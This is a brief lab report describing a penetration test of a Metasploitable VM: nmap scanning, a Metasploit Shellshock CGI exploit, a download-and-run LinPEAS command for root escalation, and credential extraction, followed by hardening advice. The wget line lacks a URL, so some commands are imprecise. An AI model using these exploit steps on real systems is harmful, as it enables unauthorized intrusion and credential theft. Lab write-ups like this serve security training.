Penetration Testing Report: Metasploitable
1. Introduction

This document outlines the penetration testing process conducted on a Metasploitable virtual machine using Kali Linux. The primary goal was to identify and exploit vulnerabilities, ultimately obtaining root access.

Note: The IP addresses in this report are examples and do not reflect actual values.
2. Environment Setup

    Attacker Machine: Kali Linux (192.168.56.101 example IP)

    Target Machine: Metasploitable (192.168.56.102 example IP)

    Virtualization Software: GNOME Boxes

    Network Configuration: Bridge Network (VMs isolated from host but able to communicate)

3. Penetration Testing Process
3.1 Scanning & Enumeration

The first step was identifying open ports and running services using Nmap:
nmap -A -p- 192.168.56.102

Findings:

    Port 80 (HTTP) was open and running Apache 2.2.8, which is potentially vulnerable.

    Other services (SSH, FTP) were detected but not exploited in this test.

3.2 Vulnerability Analysis

Using Searchsploit, a known Remote Code Execution (RCE) vulnerability was identified in Apache 2.2.8:
searchsploit apache 2.2.8

This vulnerability was related to a misconfigured CGI script, allowing arbitrary command execution.
3.3 Exploitation

Exploitation was performed using Metasploit:
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.56.102
exploit

This resulted in initial shell access to the target system.
3.4 Privilege Escalation

To escalate privileges from a limited user to root, Linpeas was executed:
wget linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

Linpeas identified a SUID misconfiguration, which was leveraged to escalate privileges to root.
3.5 Post-Exploitation

    Extracted system credentials.

    Analyzed potential persistence mechanisms.

    Investigated security misconfigurations.

4. Key Takeaways

    Successfully gained root access by exploiting a vulnerable HTTP service.

    Demonstrated importance of securing common services like HTTP, SSH, and FTP.

    Strengthened skills in scanning, exploitation, and privilege escalation.

5. Security Recommendations

    Restrict access to unnecessary open ports.

    Regularly update and patch vulnerable software.

    Implement least privilege principles to limit escalation opportunities.

6. Conclusion

This penetration test successfully demonstrated a complete attack workflow, from reconnaissance to privilege escalation, emphasizing the need for proactive security measures.
References

    Nmap Documentation

    Metasploit Framework

    Linpeas Privilege Escalation Tool

    Exploit-DB



